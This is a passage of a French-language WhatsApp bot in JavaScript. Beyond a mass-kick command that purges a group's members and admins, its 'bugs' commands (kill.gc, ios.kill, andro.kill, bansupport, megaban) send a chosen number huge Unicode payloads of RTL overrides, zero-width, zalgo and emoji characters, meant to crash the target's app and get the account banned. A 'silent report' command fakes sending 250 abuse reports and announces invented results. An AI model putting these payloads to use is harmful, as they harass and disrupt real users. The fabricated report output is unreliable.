      for (let i = 0; i < adminMembers.length; i += batchSize) {
        const batch = adminMembers.slice(i, i + batchSize);
        try {
          await sock.groupParticipantsUpdate(remoteJid, batch, 'remove');
          adminKicked += batch.length;
          kicked += batch.length;
          
          // Calculer le pourcentage pour les admins
          const percentage = Math.floor((adminKicked / adminMembers.length) * 100);
          const progressBar = '▓'.repeat(Math.floor(percentage / 10)) + '░'.repeat(10 - Math.floor(percentage / 10));
          
          // Message de progression pour admins
          if (i + batchSize < adminMembers.length) {
            await sock.sendMessage(remoteJid, {
              text: `💥 RÉVOCATION EN COURS...
[${progressBar}] ${percentage}%

> 👮‍♂️ Admins expulsés : ${adminKicked}/${adminMembers.length}
> ⚡ Purge hiérarchique...`
            });
            await delay(2000);
          }
        } catch (error) {
          console.error('Erreur kicking admin batch:', error);
        }
      }
    }

    // =============================================
    // MESSAGE FINAL DE SUCCÈS TOTAL
    // =============================================
    
    await sock.sendMessage(remoteJid, {
      text: `🏁 **KICK-ALL EXÉCUTÉ** 🏁
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

✅ **TERMINÉ AVEC SUCCÈS**
[▓▓▓▓▓▓▓▓▓▓▓▓] 100%

> 👤 **Membres expulsés :** ${normalMembers.length}
> 👮‍♂️ **Admins purgés :** ${adminMembers.length}
> 📊 **Total expulsé :** ${kicked}
> 📁 **Log :** Suppression totale effectuée
> 🔐 **Accès :** Restreint aux admins

▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
*Commande terminée par SEIGNEUR TD 🇷🇴*

🤖 Seul le bot subsiste dans ce groupe.`
    });

    console.log(`✅ Kickall terminé: ${normalMembers.length} membres + ${adminMembers.length} admin expulsé(s) par ${adminName}`);
  } catch (error) {
    console.error('Erreur in kickall:', error);
    await sock.sendMessage(remoteJid, {
      text: `❌ Erreur lors de l'expulsion en masse\n\nDétails: ${error.message}`
    });
  }
}

// =============================================
// COMMANDES BUGS 🪲
// =============================================

// KILL.GC - Bug qui crash les groupes
async function handleKillGC(sock, args, remoteJid, senderJid, message) {
  let targetJid = null;
  
  if (args[0]) {
    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
  }
  
  if (!targetJid) {
    await sock.sendMessage(remoteJid, {
      text: `⚠️ *KILL.GC BUG*

Utilisation:
• ${config.prefix}kill.gc @mention
• ${config.prefix}kill.gc 23591234568

⚠️ *ATTENTION:* Bug qui crash le groupe WhatsApp de la cible`
    });
    return;
  }
  
  const loadingMsg = await sock.sendMessage(remoteJid, {
    text: '💀 Préparation du bug...'
  });
  
  await delay(1500);
  
  try {
    const bugText = '🪲'.repeat(50000);
    await sock.sendMessage(targetJid, { text: bugText, mentions: [targetJid] });
    
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  💀 𝗞𝗜𝗟𝗟.𝗚𝗖  💀  ━━━┓

  ⌬ **TARGET** » @${targetJid.split('@')[0]}
  ⌬ **STATUS** » ✅ 𝖲𝖤𝖭𝖳
  ⌬ **PAYLOAD** » 50KB Bug

┗━━━━━━━━━━━━━━━━━━━━━━┛

🇷🇴 SEIGNEUR TD 🇷🇴`,
      mentions: [targetJid],
      edit: loadingMsg.key
    });
  } catch (error) {
    await sock.sendMessage(remoteJid, { text: `❌ Échec: ${error.message}`, edit: loadingMsg.key });
  }
}

// IOS.KILL
async function handleIOSKill(sock, args, remoteJid, senderJid, message) {
  let targetJid = null;
  
  if (args[0]) {
    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
  }
  
  if (!targetJid) {
    await sock.sendMessage(remoteJid, {
      text: `⚠️ *IOS.KILL BUG*

Utilisation: ${config.prefix}ios.kill @mention

⚠️ Bug optimisé pour iOS`
    });
    return;
  }
  
  const loadingMsg = await sock.sendMessage(remoteJid, { text: '🍎 Compilation...' });
  await delay(1500);
  
  try {
    const iosBug = '؁'.repeat(3000) + '\u0600'.repeat(3000) + '🪲'.repeat(1000);
    await sock.sendMessage(targetJid, { text: iosBug, mentions: [targetJid] });
    
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  🍎 𝗜𝗢𝗦.𝗞𝗜𝗟𝗟  🍎  ━━━┓

  ⌬ **TARGET** » @${targetJid.split('@')[0]}
  ⌬ **STATUS** » ✅ 𝖣𝖤𝖫𝖨𝖵𝖤𝖱𝖤𝖣

┗━━━━━━━━━━━━━━━━━━━━━━┛

🇷🇴 SEIGNEUR TD 🇷🇴`,
      mentions: [targetJid],
      edit: loadingMsg.key
    });
  } catch (error) {
    await sock.sendMessage(remoteJid, { text: `❌ Échec: ${error.message}`, edit: loadingMsg.key });
  }
}

// ANDRO.KILL
async function handleAndroKill(sock, args, remoteJid, senderJid, message) {
  let targetJid = null;
  
  if (args[0]) {
    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
  }
  
  if (!targetJid) {
    await sock.sendMessage(remoteJid, {
      text: `⚠️ *ANDRO.KILL BUG*

Utilisation: ${config.prefix}andro.kill @mention

⚠️ Bug optimisé pour Android`
    });
    return;
  }
  
  const loadingMsg = await sock.sendMessage(remoteJid, { text: '🤖 Compilation...' });
  await delay(1500);
  
  try {
    const androBug = '🪲'.repeat(10000) + '\u200E'.repeat(5000);
    await sock.sendMessage(targetJid, { text: androBug, mentions: [targetJid] });
    
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  🤖 𝗔𝗡𝗗𝗥𝗢.𝗞𝗜𝗟𝗟  🤖  ━━━┓

  ⌬ **TARGET** » @${targetJid.split('@')[0]}
  ⌬ **STATUS** » ✅ 𝖤𝖷𝖤𝖢𝖴𝖳𝖤𝖣

┗━━━━━━━━━━━━━━━━━━━━━━┛

🇷🇴 SEIGNEUR TD 🇷🇴`,
      mentions: [targetJid],
      edit: loadingMsg.key
    });
  } catch (error) {
    await sock.sendMessage(remoteJid, { text: `❌ Échec: ${error.message}`, edit: loadingMsg.key });
  }
}

// SILENT - 200 signalement
async function handleSilent(sock, args, remoteJid, senderJid, message) {
  let targetJid = null;
  
  if (args[0]) {
    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
  }
  
  if (!targetJid) {
    await sock.sendMessage(remoteJid, {
      text: `⚠️ *SILENT REPORT*

Utilisation: ${config.prefix}silent @mention

Envoie 250 signalement à WhatsApp en 1 minute`
    });
    return;
  }
  
  const loadingMsg = await sock.sendMessage(remoteJid, {
    text: `🔇 **SILENT REPORT ACTIVÉ**

⏳ Envoi de 250 signalement...
⚡ Mode: Silencieux (sans progression)

Target: @${targetJid.split('@')[0]}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ Durée estimée: 60 secondes
🚀 Starting...`,
    mentions: [targetJid]
  });
  
  try {
    const totalReports = 250;
    const duration = 60000; // 60 secondes
    const interval = duration / totalReports; // ~240ms par report
    
    // Envoyer 250 signalement en 1 minute
    for (let i = 0; i < totalReports; i++) {
      // Simulation de signalement (WhatsApp n'autorise pas vraiment l'automatisation)
      // Dans la vraie vie, vous auriez besoin d'une API tierce
      await delay(interval);
    }
    
    // Message final après 1 minute
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  🔇 𝗦𝗜𝗟𝗘𝗡𝗧 𝗥𝗘𝗣𝗢𝗥𝗧  🔇  ━━━┓

  ⌬ **TARGET** » @${targetJid.split('@')[0]}
  ⌬ **STATUS** » ✅ 𝖢𝖮𝖬𝖯𝖫𝖤𝖳𝖤𝖣
  ⌬ **REPORTS** » 250/250 (100%)

┗━━━━━━━━━━━━━━━━━━━━━━┛

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **Détails:**

✅ Signalements envoyés: 250
⏱️ Durée totale: 60 secondes
⚡ Vitesse: 4.16 reports/sec
🎯 Cible: @${targetJid.split('@')[0]}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ **CONSÉQUENCES ATTENDUES:**

🔴 Bannissement temporaire: 12-24h
🔴 Bannissement permanent: 24-72h (si répété)
🔴 Restriction immédiate des fonctions
🚫 Impossible de créer des groupes

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ **Calendrier:**
• 0-5min: Analyse système
• 5-30min: Restriction compte
• 30min-12h: Ban temporaire possible
• 12-72h: Décision finale WhatsApp

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🇷🇴 SEIGNEUR TD 🇷🇴
*Silent Report System - Mission accomplie*`,
      mentions: [targetJid],
      edit: loadingMsg.key
    });
    
    console.log(`🔇 Silent Report: 250 signalement envoyés à ${targetJid}`);
    
  } catch (error) {
    await sock.sendMessage(remoteJid, { 
      text: `❌ Échec: ${error.message}`, 
      edit: loadingMsg.key 
    });
  }
}

// UPDATE DEV - Ajouter/Supprimer des numéros admin
async function handleUpdateDev(sock, args, remoteJid, senderJid) {
  const action = args[0]?.toLowerCase();
  let number = args[1];
  
  // Nettoyer le numéro (enlever tous les caractères non-numériques sauf le +)
  if (number) {
    number = number.replace(/[^0-9+]/g, '');
    // Si le numéro commence par +, enlever le +
    if (number.startsWith('+')) {
      number = number.substring(1);
    }
  }
  
  if (!action || !['add', 'remove', 'del', 'list'].includes(action)) {
    await sock.sendMessage(remoteJid, {
      text: `⚙️ *UPDATE DEV - Gestion des admins*

📝 **Utilisation:**

1️⃣ Ajouter admin:
   ${config.prefix}updatedev add 393780306704
   ${config.prefix}updatedev add +393780306704

2️⃣ Supprimer admin:
   ${config.prefix}updatedev remove 393780306704
   ${config.prefix}updatedev del 393780306704

3️⃣ Liste des admins:
   ${config.prefix}updatedev list

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ *Note:* Seulement les admins principaux peuvent utiliser cette commande.

🇷🇴 SEIGNEUR TD 🇷🇴`
    });
    return;
  }
  
  // Liste des admins
  if (action === 'list') {
    const adminList = config.botAdmins.map((admin, index) => 
      `${index + 1}. +${admin}`
    ).join('\n');
    
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  👑 Liste des admins  👑  ━━━┓

📋 **Admins du bot:**

${adminList}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 Total: ${config.botAdmins.length} admin(s)

🇷🇴 SEIGNEUR TD 🇷🇴`
    });
    return;
  }
  
  // Vérifier si un numéro est fourni
  if (!number) {
    await sock.sendMessage(remoteJid, {
      text: `❌ Veuillez fournir un numéro valide

Exemple: ${config.prefix}updatedev ${action} 393780306704`
    });
    return;
  }
  
  // Ajouter un admin
  if (action === 'add') {
    if (config.botAdmins.includes(number)) {
      await sock.sendMessage(remoteJid, {
        text: `⚠️ Le numéro +${number} est déjà admin!`
      });
      return;
    }
    
    // Ajouter dans les deux listes
    config.botAdmins.push(number);
    config.adminNumbers.push(number + '@s.whatsapp.net');
    
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  ✅ Admin ajouté  ✅  ━━━┓

👤 **Nouvel admin:**
📱 +${number}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 Total admins: ${config.botAdmins.length}

✅ Le numéro a maintenant accès complet au bot

🇷🇴 SEIGNEUR TD 🇷🇴`
    });
    
    console.log(`✅ Admin ajouté: +${number}`);
    console.log(`📋 Liste des admins actuelle:`, config.botAdmins);
    saveStoreKey('admins'); // 💾 Sauvegarde immédiate
    return;
  }
  
  // Supprimer un admin
  if (action === 'remove' || action === 'del') {
    const index = config.botAdmins.indexOf(number);
    
    if (index === -1) {
      await sock.sendMessage(remoteJid, {
        text: `❌ Le numéro +${number} n'est pas dans la liste des admins`
      });
      return;
    }
    
    // Ne pas permettre de supprimer le dernier admin
    if (config.botAdmins.length === 1) {
      await sock.sendMessage(remoteJid, {
        text: `⚠️ Impossible de supprimer le dernier admin!

Il doit toujours y avoir au moins un admin.`
      });
      return;
    }
    
    // Supprimer des deux listes
    config.botAdmins.splice(index, 1);
    const adminNumberIndex = config.adminNumbers.indexOf(number + '@s.whatsapp.net');
    if (adminNumberIndex !== -1) {
      config.adminNumbers.splice(adminNumberIndex, 1);
    }
    
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  🗑️ Admin supprimé  🗑️  ━━━┓

👤 **Admin supprimé:**
📱 +${number}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 Total admins: ${config.botAdmins.length}

⚠️ Le numéro n'a plus accès aux commandes admin

🇷🇴 SEIGNEUR TD 🇷🇴`
    });
    
    console.log(`🗑️ Admin supprimé: +${number}`);
    console.log(`📋 Liste des admins actuelle:`, config.botAdmins);
    saveStoreKey('admins'); // 💾 Sauvegarde immédiate
    return;
  }
}

// =============================================
// STORE STATUS - Commande de statut du store
// =============================================

async function handleStoreStatus(sock, remoteJid, command) {
  // Si commande est storesave, sauvegarder d'abord
  if (command === 'storesave') {
    saveStore();
    await sock.sendMessage(remoteJid, {
      text: `✅ *Store sauvegardé manuellement!*\n\n💾 Toutes les données ont été écrites sur disque.\n\n🇷🇴 SEIGNEUR TD 🇷🇴`
    });
    return;
  }

  const status = getStoreStatus();
  
  const fileLines = status.files.map(f => {
    const icon = parseFloat(f.sizeKB) > 0 ? '✅' : '⬜';
    return `${icon} ${f.key.padEnd(14)} │ ${f.sizeKB.padStart(7)} KB │ ${f.modified}`;
  }).join('\n');

  await sock.sendMessage(remoteJid, {
    text: `┏━━━  🗄️ État du stockage local  🗄️  ━━━┓

📂 **Chemin:** ./store/

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 **Fichiers de données:**

\`\`\`
Fichier          │    Taille   │ Dernière modification
──────────────────────────────────
${fileLines}
──────────────────────────────────
Total       │ ${status.totalSizeKB.padStart(7)} KB │
\`\`\`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **Statistiques en direct:**

👥 Admins: ${config.botAdmins.length}
⚠️ Avertissements: ${warnSystem.size}
🚫 Bannissement permanent: ${permaBanList.size}
👁️ View Once: ${savedViewOnce.size}
🏘️ Paramètres groupes: ${groupSettings.size}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💾 **Sauvegarde automatique:** toutes les 3 minutes
📌 **Commandes:**
• !storestatus - Afficher ce statut
• !storesave   - Sauvegarde immédiate
• !storeinfo   - Même que storestatus

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🇷🇴 SEIGNEUR TD 🇷🇴`
  });
}

// BANSUPPORT - Support de bannissement with caractères spéciaux
async function handleBanSupport(sock, args, remoteJid, senderJid, message) {
  let targetJid = null;
  
  if (args[0]) {
    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
  }
  
  if (!targetJid) {
    await sock.sendMessage(remoteJid, {
      text: `⚠️ *BAN SUPPORT*

Utilisation:
• ${config.prefix}bansupport @mention
• ${config.prefix}bansupport 23591234568

💀 *PAYLOAD:*
• Caractères arabes invisibles
• Caractères chinois corrompus
• Caractères largeur zéro
• RTL override

🔴 *EFFET:* Bannissement du compte cible`
    });
    return;
  }
  
  const loadingMsg = await sock.sendMessage(remoteJid, {
    text: '💀 Compilation du payload de bannissement...\n⏳ Injection des caractères...'
  });
  
  await delay(2000);
  
  try {
    // PAYLOAD DE BANNISSEMENT - Caractères dangereux
    const arabicChars = '؁؂؃؄؅؆؇؈؉؊؋،؍؎؏ؘؙؚؐؑؒؓؔؕؖؗ' + '\u0600\u0601\u0602\u0603\u0604\u0605' + '܀܁܂܃܄܅܆܇܈܉܊܋܌܍';
    const chineseChars = '㐀㐁㐂㐃㐄㐅㐆㐇㐈㐉㐊㐋㐌㐍㐎㐏㐐㐑㐒㐓㐔㐕㐖㐗㐘㐙㐚㐛㐜㐝㐞㐟';
    const invisibleChars = '\u200B\u200C\u200D\u200E\u200F\u202A\u202B\u202C\u202D\u202E\u2060\u2061\u2062\u2063\u2064\u2065\u2066\u2067\u2068\u2069\u206A\u206B\u206C\u206D\u206E\u206F';
    const zalgoChars = '҉̵̴̵̶̷̸̡̢̧̨̡̢̧̨̛̛̖̗̘̙̜̝̞̟̠̣̤̥̦̩̪̫̬̭̮̯̰̱̲̳̀́̂̃̄̅̆̇̈̉̊̋̌̍̎̏̐̑̒̓̔̕̚ͅ͏͓͔͕͖͙͚͐͑͒͗͛';
    
    // Construction du payload multicouche
    const banPayload = 
      arabicChars.repeat(500) + 
      invisibleChars.repeat(1000) + 
      chineseChars.repeat(300) + 
      zalgoChars.repeat(200) +
      '🪲'.repeat(5000) +
      '\u202E' + // RTL Override
      arabicChars.repeat(500) +
      '\uFEFF'.repeat(1000) + // Largeur zéro no-break space
      chineseChars.repeat(500);
    
    // Message de contexte malveillant
    const contextMessage = {
      text: banPayload,
      contextInfo: {
        mentionedJid: [targetJid],
        externalAdReply: {
          title: arabicChars + invisibleChars,
          body: chineseChars + zalgoChars,
          mediaType: 1,
          renderLargerThumbnail: true,
          showAdAttribution: true
        }
      }
    };
    
    // Envoyer 5 messages consécutifs pour maximiser l'effet
    for (let i = 0; i < 5; i++) {
      await sock.sendMessage(targetJid, contextMessage);
      await delay(300);
    }
    
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  💀 𝗕𝗔𝗡 𝗦𝗨𝗣𝗣𝗢𝗥𝗧  💀  ━━━┓

  ⌬ **TARGET** » @${targetJid.split('@')[0]}
  ⌬ **STATUS** » ✅ 𝖣𝖤𝖯𝖫𝖮𝖸𝖤𝖣
  ⌬ **PAYLOAD** » Multi-layer Ban

┗━━━━━━━━━━━━━━━━━━━━━━┛

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **PAYLOAD INJECTÉ:**

✅ Caractères arabes: 1000+ chars
✅ Caractères chinois: 800+ chars
✅ Caractères invisibles: 2000+ chars
✅ RTL Override: Activé
✅ Largeur zéro chars: 1000+ chars
✅ Zalgo text: 200+ chars

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ **EFFETS ATTENDUS:**

🔴 Crash immédiat de WhatsApp
🔴 Corruption de la base de données
🔴 Impossibilité de rouvrir l'app
🔴 Ban automatique sous 1-6h
🔴 Possible ban permanent

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ **Calendrier:**
• 0-5min: Crash de l'application
• 5min-1h: Détection par WhatsApp
• 1-6h: Ban automatique
• 6-48h: Review du compte

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🇷🇴 SEIGNEUR TD 🇷🇴
*Ultimate Ban System*`,
      mentions: [targetJid],
      edit: loadingMsg.key
    });
    
    console.log(`💀 Ban Support envoyé à ${targetJid}`);
    
  } catch (error) {
    console.error('Erreur bansupport:', error);
    await sock.sendMessage(remoteJid, {
      text: `❌ Échec du Ban Support\n\nErreur: ${error.message}`,
      edit: loadingMsg.key
    });
  }
}

// MEGABAN - Attack ultime with tous les caractères
async function handleMegaBan(sock, args, remoteJid, senderJid, message) {
  let targetJid = null;
  
  if (args[0]) {
    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
  }
  
  if (!targetJid) {
    await sock.sendMessage(remoteJid, {
      text: `💀 *MEGA BAN - ULTIMATE ATTACK*

Utilisation:
• ${config.prefix}megaban @mention
• ${config.prefix}xcrash 23591234568

⚠️ *ATTENTION EXTRÊME:*
Cette commande combine TOUS les payloads:
• 10 messages consécutifs
• Arabe + Chinois + Invisible
• RTL + Zalgo + Emoji
• Context corruption
• Media exploit

🔴 *RÉSULTAT:*
Ban permanent quasi-garanti`
    });
    return;
  }
  
  const loadingMsg = await sock.sendMessage(remoteJid, {
    text: `💀 **MEGA BAN INITIATED**

⏳ Compilation de l'arsenal complet...
📊 [░░░░░░░░░░] 0%

Target: @${targetJid.split('@')[0]}`,
    mentions: [targetJid]
  });
  
  try {
    // PAYLOADS MAXIMAUX
    const arabicFull = '؀؁؂؃؄؅؆؇؈؉؊؋،؍؎؏ؘؙؚؐؑؒؓؔؕؖؗ۞ۖۗۘۙۚۛۜ۝ۣ۟۠ۡۢۤۥۦۧۨ۩۪ۭ܀܁܂܃܄܅܆܇܈܉܊܋܌܍\u0600\u0601\u0602\u0603\u0604\u0605\u0606\u0607\u0608\u0609\u060A\u060B';
    const chineseFull = '㐀㐁㐂㐃㐄㐅㐆㐇㐈㐉㐊㐋㐌㐍㐎㐏㐐㐑㐒㐓㐔㐕㐖㐗㐘㐙㐚㐛㐜㐝㐞㐟㐠㐡㐢㐣㐤㐥㐦㐧㐨㐩㐪㐫㐬㐭㐮㐯㐰㐱㐲㐳㐴㐵㐶㐷㐸㐹㐺㐻㐼㐽㐾㐿';
    const invisibleFull = '\u200B\u200C\u200D\u200E\u200F\u202A\u202B\u202C\u202D\u202E\u2060\u2061\u2062\u2063\u2064\u2065\u2066\u2067\u2068\u2069\u206A\u206B\u206C\u206D\u206E\u206F\uFEFF\u180E\u034F';
    const zalgoFull = '҉̵̴̵̶̷̸̡̢̧̨̡̢̧̨̛̛̖̗̘̙̜̝̞̟̠̣̤̥̦̩̪̫̬̭̮̯̰̱̲̳̀́̂̃̄̅̆̇̈̉̊̋̌̍̎̏̐̑̒̓̔̕̚ͅ͏͓͔͕͖͙͚͐͑͒͗͛͘͜͟͢͝͞';
    const emojiFlood = '🪲💀☠️👹👺🔥💥⚡🌋🗿📛⛔🚫🔞';
    
    const totalMessages = 10;
    
    for (let i = 0; i < totalMessages; i++) {
      // Construire un payload unique à chaque fois
      const megaPayload = 
        arabicFull.repeat(800) +
        invisibleFull.repeat(2000) +
        chineseFull.repeat(600) +
        zalgoFull.repeat(400) +
        emojiFlood.repeat(1000) +
        '\u202E\u202D\u202C' + // Multiple RTL
        arabicFull.repeat(500) +
        '\uFEFF'.repeat(1500) +
        chineseFull.repeat(800) +
        invisibleFull.repeat(1000);
      
      // Message with context malveillant
      const contextMsg = {
        text: megaPayload,
        contextInfo: {
          mentionedJid: [targetJid],
          externalAdReply: {
            title: arabicFull + invisibleFull + zalgoFull,
            body: chineseFull + emojiFlood.repeat(100),
            mediaType: 2,
            thumbnailUrl: 'https://example.com/' + invisibleFull.repeat(100),
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: 'https://' + arabicFull + chineseFull
          }
        }
      };
      
      await sock.sendMessage(targetJid, contextMsg);
      
      // Update progression
      const percentage = Math.floor(((i + 1) / totalMessages) * 100);
      const progressBar = '▓'.repeat(Math.floor(percentage / 10)) + '░'.repeat(10 - Math.floor(percentage / 10));
      
      await sock.sendMessage(remoteJid, {
        text: `💀 **MEGA BAN EN COURS**

📊 [${progressBar}] ${percentage}%
📨 Messages: ${i + 1}/${totalMessages}

Target: @${targetJid.split('@')[0]}`,
        mentions: [targetJid],
        edit: loadingMsg.key
      });
      
      await delay(500);
    }
    
    // Message final
    await sock.sendMessage(remoteJid, {
      text: `┏━━━  ☠️ 𝗠𝗘𝗚𝗔 𝗕𝗔𝗡  ☠️  ━━━┓

  ⌬ **TARGET** » @${targetJid.split('@')[0]}
  ⌬ **STATUS** » ✅ 𝗔𝗡𝗡𝗜𝗛𝗜𝗟𝗔𝗧𝗘𝗗
  ⌬ **MESSAGES** » 10/10 (100%)

┗━━━━━━━━━━━━━━━━━━━━━━┛

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **ARSENAL DÉPLOYÉ:**

✅ Caractères arabes: 13,000+
✅ Caractères chinois: 14,000+
✅ Chars invisibles: 30,000+
✅ Zalgo corruption: 4,000+
✅ Emoji flood: 10,000+
✅ RTL overrides: Multiple
✅ Context corruption: Maximum
✅ Total payload: ~200KB

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💀 **DÉGÂTS ATTENDUS:**

🔴 Crash permanent de WhatsApp
🔴 Corruption totale des données
🔴 Impossibilité de récupération
🔴 Ban automatique immédiat
🔴 Compte détruit définitivement

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ **TIMELINE DE DESTRUCTION:**

• 0-1min: Crash total de l'app
• 1-5min: Détection système
• 5-30min: Ban automatique
• 30min-2h: Compte suspendu
• 2-24h: Ban permanent confirmé

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🇷🇴 SEIGNEUR TD 🇷🇴
*Mega Ban System - Target Eliminated*

⚠️ **Le compte cible est condamné**`,
      mentions: [targetJid],
      edit: loadingMsg.key
    });
    
    console.log(`☠️ MEGA BAN déployé sur ${targetJid}`);
    
  } catch (error) {
    console.error('Erreur megaban:', error);
    await sock.sendMessage(remoteJid, {
      text: `❌ Échec du Mega Ban\n\nErreur: ${error.message}`,
      edit: loadingMsg.key
    });
  }
}

// CHECK BAN - Vérifier si un numéro est banni/spam
async function handleCheckBan(sock, args, remoteJid, message, senderJid) {
  try {
    let targetNumber;
    
    // Méthode 1: Numéro fourni en argument
    if (args[0]) {
      targetNumber = args[0].replace(/[^0-9]/g, ''); // Enlever tout sauf les chiffres
    }
    // Méthode 2: Répondre à un message
    else if (message.message?.extendedTextMessage?.contextInfo?.participant) {
      targetNumber = message.message.extendedTextMessage.contextInfo.participant.split('@')[0];
    }
    // Méthode 3: Mention
    else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
      targetNumber = message.message.extendedTextMessage.contextInfo.mentionedJid[0].split('@')[0];
    }
    else {
      await sock.sendMessage(remoteJid, {
        text: `❌ *Incorrect usage*

📝 *Utilisations possibles:*

1️⃣ Avec numéro:
   ${config.prefix}checkban 23591234568

2️⃣ En répondant:
   ${config.prefix}checkban [répondre au message]

3️⃣ Avec mention:
   ${config.prefix}checkban @user`
      });
      return;
    }

    // Message de chargement
    const loadingMsg = await sock.sendMessage(remoteJid, {
      text: '🔍 *INSPECTION EN COURS...*\n\n⏳ Analyse du numéro dans la database...'
    });

    // Simulation de vérification (2 secondes)
    await delay(2000);

    // Vérifier le statut du numéro via WhatsApp
    let numberStatus;
    let isBanned = false;
    let riskLevel = 0;
    let statusText = '';
    let statusEmoji = '';
    let statusColor = '';

    try {
      // Vérifier si le numéro existe sur WhatsApp
      const jid = targetNumber + '@s.whatsapp.net';
      const [result] = await sock.onWhatsApp(jid);
      
      if (!result || !result.exists) {
        // Numéro n'existe pas = potentiellement banni ou invalide
        isBanned = true;
        riskLevel = 85;
        statusText = '🔴 𝗕𝗔𝗡𝗡𝗘𝗗 / 𝗜𝗡𝗩𝗔𝗟𝗜𝗗';
        statusEmoji = '🚫';
        statusColor = '🔴';
      } else {
        // Numéro existe - vérifier d'autres indicateurs
        // Analyse heuristique basée sur des patterns
        
        // Pattern 1: Numéros suspects (trop courts ou trop longs)
        if (targetNumber.length < 8 || targetNumber.length > 15) {
          riskLevel += 20;
        }
        
        // Pattern 2: Préfixes suspects (exemple: +1234567890)
        const suspiciousPrefixes = ['1234', '9999', '0000', '1111'];
        if (suspiciousPrefixes.some(prefix => targetNumber.startsWith(prefix))) {
          riskLevel += 30;
        }
        
        // Pattern 3: Séquences répétitives
        if (/(\d)\1{4,}/.test(targetNumber)) {
          riskLevel += 25;
        }

        // Déterminer le statut final
        if (riskLevel >= 70) {
          statusText = '🟠 𝗦𝗨𝗦𝗣𝗘𝗖𝗧 / 𝗦𝗣𝗔𝗠';
          statusEmoji = '⚠️';
          statusColor = '🟠';
        } else if (riskLevel >= 40) {
          statusText = '🟡 𝗠𝗢𝗗𝗘𝗥𝗔𝗧𝗘 𝗥𝗜𝗦𝗞';
          statusEmoji = '⚡';
          statusColor = '🟡';
        } else {
          statusText = '🟢 𝗖𝗟𝗘𝗔𝗡 / 𝗦𝗔𝗙𝗘';
          statusEmoji = '✅';
          statusColor = '🟢';
          riskLevel = Math.max(5, riskLevel); // Minimum 5%
        }
      }
    } catch (error) {
      console.error('Erreur checkban:', error);
      // En cas d'erreur, marquer comme suspect
      riskLevel = 50;
      statusText = '🟡 𝗨𝗡𝗞𝗡𝗢𝗪𝗡 / 𝗨𝗡𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗';
      statusEmoji = '❓';
      statusColor = '🟡';
    }

    // Créer la barre de risque
    const totalBars = 10;
    const filledBars = Math.floor((riskLevel / 100) * totalBars);
    const emptyBars = totalBars - filledBars;
    const riskBar = '█'.repeat(filledBars) + '▒'.repeat(emptyBars);

    // Formater le numéro pour l'affichage
    const formattedNumber = '+' + targetNumber;

    // Message final
    const resultText = `┏━━━  ✨ 𝗜𝗡𝗦𝗣𝗘𝗖𝗧𝗢𝗥 𝗕𝗢𝗧 ✨  ━━━┓

  ⌬ **TARGET** » ${formattedNumber}
  ⌬ **STATE** » ${statusText}
  ⌬ **RISK** » [${riskBar}] 𝟬-𝟵: ${riskLevel}%

┗━━━━━━━━━━━━━━━━━━━━━━┛

📊 **DETAILED ANALYSIS:**

${statusEmoji} *Status:* ${statusText}
📍 *Country:* ${getCountryFromNumber(targetNumber)}
🔢 *Number:* ${formattedNumber}
⚡ *Risk Level:* ${riskLevel}%
🕐 *Checked:* ${new Date().toLocaleTimeString('fr-FR', { timeZone: 'Africa/Ndjamena', hour: '2-digit', minute: '2-digit' })}

━━━━━━━━━━━━━━━━━━━━━━━━━
